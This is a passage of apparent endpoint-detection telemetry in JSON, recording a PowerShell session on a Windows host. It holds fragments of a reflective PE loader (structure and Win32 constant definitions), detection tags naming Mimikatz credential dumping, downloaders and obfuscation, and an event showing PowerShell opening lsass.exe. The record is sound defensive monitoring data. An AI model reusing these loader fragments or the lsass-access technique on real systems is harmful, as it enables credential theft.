                                "$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null",
                                "$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null",
                                "$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null",
                                "$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null",
                                "$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null",
                                "$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null",
                                "$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null",
                                "$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')",
                                "$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')",
                                "$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')",
                                "($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null",
                                "($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null",
                                "($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null",
                                "($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null",
                                "($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null",
                                "($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null",
                                "($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null",
                                "($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null",
                                "($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null",
                                "($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null",
                                "($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null",
                                "($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null",
                                "($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null",
                                "($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null",
                                "($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null",
                                "($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null",
                                "($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null",
                                "($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null",
                                "($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null",
                                "($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null",
                                "($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null",
                                "($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null",
                                "($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null",
                                "($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null",
                                "($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null",
                                "($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null",
                                "($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null",
                                "($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null",
                                "($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null",
                                "($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null",
                                "($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null",
                                "($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null",
                                "($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null",
                                "($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null",
                                "($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null",
                                "($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null",
                                "($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null",
                                "($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null",
                                "($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null",
                                "($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null",
                                "($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null",
                                "($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null",
                                "($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null",
                                "($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null",
                                "($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null",
                                "($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null",
                                "($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null",
                                "($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null",
                                "($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null",
                                "($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null",
                                "($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null",
                                "($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null",
                                "($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null",
                                "($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null",
                                "($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null",
                                "($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null",
                                "($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null",
                                "($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null",
                                "($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null"
                            ],
                            "name": "action:DotNet.Type/Define"
                        },
                        {
                            "lines": [
                                "$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]",
                                "$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))"
                            ],
                            "name": "action:DotNet.Type/Reflect"
                        },
                        {
                            "lines": [
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType",
                                "$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES"
                            ],
                            "name": "action:Member/Add"
                        },
                        {
                            "lines": [
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))",
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))",
                                "$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))",
                                "$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')",
                                "$Win32Types = New-Object System.Object"
                            ],
                            "name": "action:Object/New"
                        }
                    ],
                    "length": 26387,
                    "timestamp": "2024-08-01T15:54:10.381Z"
                },
                {
                    "hash": "BC5A71D5CE88E8785F993BA4E111260220527A11FFD0AEB6D2AA1719EDCAA16E",
                    "intentions": [
                        {
                            "lines": [
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_ABSOLUTE -Value 0",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_DIR64 -Value 10",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_REL_BASED_HIGHLOW -Value 3",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_DISCARDABLE -Value 0x02000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_EXECUTE -Value 0x20000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_READ -Value 0x40000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READWRITE -Value 0x40",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_WRITECOPY -Value 0x80",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOCACHE -Value 0x200",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020",
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008"
                            ],
                            "name": "action:Member/Add"
                        },
                        {
                            "lines": [
                                "$Win32Constants = New-Object System.Object"
                            ],
                            "name": "action:Object/New"
                        },
                        {
                            "lines": [
                                "$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000"
                            ],
                            "name": "observable:encoding.binary"
                        }
                    ],
                    "length": 3074,
                    "timestamp": "2024-08-01T15:54:10.503Z"
                }
            ],
            "tags": [
                "@AC.ScriptExecuted"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:02.237Z",
            "traceId": "fdfd0e59-46b6-4769-b31a-bf418dfdb4d0",
            "uniqueRuleId": 28001,
            "version": "3.0",
            "severity": "s4",
            "detectionsSets": [
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.Execution",
                        "@ATE.T1003.004",
                        "@ATE.T1059.001",
                        "@MSI._process_ps_invoke_mimikatz"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1082",
                        "@ATE.T1059.001",
                        "@MSI._apt_process_PS_env_systeminfo"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.CommandAndControl",
                        "@ATE.T1059.001",
                        "@ATE.T1105",
                        "@ATE.T1071",
                        "@MSI._process_psdownload"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1082",
                        "@ATE.T1016",
                        "@ATE.T1059.001",
                        "@ATE.T1047",
                        "@MSI._apt_process_PS_win32_systeminfo"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.DefenseEvasion",
                        "@ATE.T1059.001",
                        "@ATE.T1027",
                        "@MSI._process_psobfuscation_character_tick"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.LateralMovement",
                        "@ATA.DefenseEvasion",
                        "@ATA.Execution",
                        "@ATE.T1003.001",
                        "@ATE.T1003.002",
                        "@ATE.T1003.003",
                        "@ATE.T1003.004",
                        "@ATE.T1003.005",
                        "@ATE.T1003.006",
                        "@ATE.T1003.007",
                        "@ATE.T1003.008",
                        "@ATE.T1558.001",
                        "@ATE.T1558.002",
                        "@ATE.T1552.001",
                        "@ATE.T1552.002",
                        "@ATE.T1552.004",
                        "@ATE.T1552.006",
                        "@ATE.T1550.002",
                        "@ATE.T1550.003",
                        "@ATE.T1059.001",
                        "@MSI._ps_redteam_credaccess_nishang"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.Execution",
                        "@ATA.Persistence",
                        "@ATA.PrivilegeEscalation",
                        "@ATE.T1003.001",
                        "@ATE.T1053.005",
                        "@ATE.T1059.001",
                        "@MSI._process_schtasks_mimikatz_creddump_via_powershell"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATE.T1059.001",
                        "@MSI._process_psexecexpression"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Discovery",
                        "@ATA.Execution",
                        "@ATE.T1033",
                        "@ATE.T1059.001",
                        "@ATE.T1087.001",
                        "@MSI._apt_process_PS_Get_userinfo"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.DefenseEvasion",
                        "@ATE.T1059.001",
                        "@ATE.T1027",
                        "@ATE.T1140",
                        "@MSI._process_psobfuscation"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.CommandAndControl",
                        "@ATA.Execution",
                        "@ATE.T1105",
                        "@ATE.T1059.001",
                        "@MSI._malware_powershell_downloader_low"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATE.T1003.004",
                        "@MSI._process_mimikatz_creddump"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATE.T1059.001",
                        "@ATE.T1047",
                        "@MSI._apt_process_gwmi"
                    ]
                },
                {
                    "sev": "s4",
                    "tags": [
                        "@ATA.CredentialAccess",
                        "@ATA.Execution",
                        "@ATE.T1003.004",
                        "@ATE.T1059.001",
                        "@MSI._process_ps_invoke_mimikatz_script"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.DefenseEvasion",
                        "@ATE.T1059.001",
                        "@ATE.T1027",
                        "@ATE.T1140",
                        "@MSI._process_psobfuscation_frombase64"
                    ]
                },
                {
                    "sev": "s0",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.Discovery",
                        "@ATE.T1059.001",
                        "@ATE.T1057",
                        "@MSI._process_ps_get_process"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.PrivilegeEscalation",
                        "@ATA.DefenseEvasion",
                        "@ATA.Execution",
                        "@ATE.T1134.001",
                        "@ATE.T1134.002",
                        "@ATE.T1134.003",
                        "@ATE.T1068",
                        "@ATE.T1059.001",
                        "@MSI._ps_redteam_accesscontrol_nishang"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.LateralMovement",
                        "@ATA.Execution",
                        "@ATE.T1021.006",
                        "@ATE.T1059.001",
                        "@MSI._process_remote_invoke_command"
                    ]
                },
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.CommandAndControl",
                        "@ATA.Execution",
                        "@ATE.T1102.003",
                        "@ATE.T1059.001",
                        "@MSI._process_PS_public_repos"
                    ]
                }
            ],
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [],
                "data": "QzpcV2luZG93c1xzeXN0ZW0zMlx3aW5kb3dzcG93ZXJzaGVsbFx2MS4wXHBvd2Vyc2hlbGxfaXNlLmV4ZQ==",
                "moduleName": "",
                "name": "FindFirstFile",
                "result": "1515591479536",
                "targetPid": 0
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.853Z",
            "traceId": "3e97f9db-1f0b-4875-8a0b-36573e80fe96",
            "uniqueRuleId": 19120,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Modified",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:48:27.822Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:48:27.822Z",
                "md5": "132C53EDB02DFDD83C38CC67F91AA9EF",
                "mhdr": "0200000001000000",
                "name": "590aee7bdd69b59b.customDestinations-ms",
                "path": "C:\\Users\\cdaauto\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\CustomDestinations\\590aee7bdd69b59b.customDestinations-ms",
                "sha1": "37504C974176C1F29FA38385267D9FA176A080CB",
                "sha256": "37B287BFD96F44A051984E90EEF0C5DF4B8514248FD6FCF8D5B253849C7486C5",
                "size": 6229
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NonPECreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.870Z",
            "traceId": "24de422d-ef1c-4516-a039-90107c323001",
            "uniqueRuleId": 21,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "accessType": 16,
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Process Accessed",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "relatedProcess": {
                "cmdLine": "C:\\Windows\\system32\\lsass.exe",
                "integrity": 4,
                "pid": 680,
                "procFileAttrs": {
                    "embedFilename": "lsass.exe",
                    "fileType": "PE",
                    "md5": "60E18F7B8D1F43731D0E9169C2D16547",
                    "name": "lsass.exe",
                    "path": "C:\\Windows\\System32\\lsass.exe",
                    "reputation": {
                        "reputation": 99,
                        "vtpPrivileges": 1
                    },
                    "sha1": "83EBB66F070956225959EE773B468F89ED55479C",
                    "sha256": "EFA9E8325232BBD3F9A118D396DE04370E56C3C7B6D552FAB46B5B39F3AD522D",
                    "size": 60640,
                    "subsystem": 2
                },
                "processName": "lsass.exe",
                "user": {
                    "domain": "NT AUTHORITY",
                    "id": "S-1-5-18",
                    "name": "NT AUTHORITY\\SYSTEM"
                }
            },
            "rv": 4528,
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:16.036Z",
            "traceId": "f9d41ed1-3afe-49d8-9043-9116260257e8",
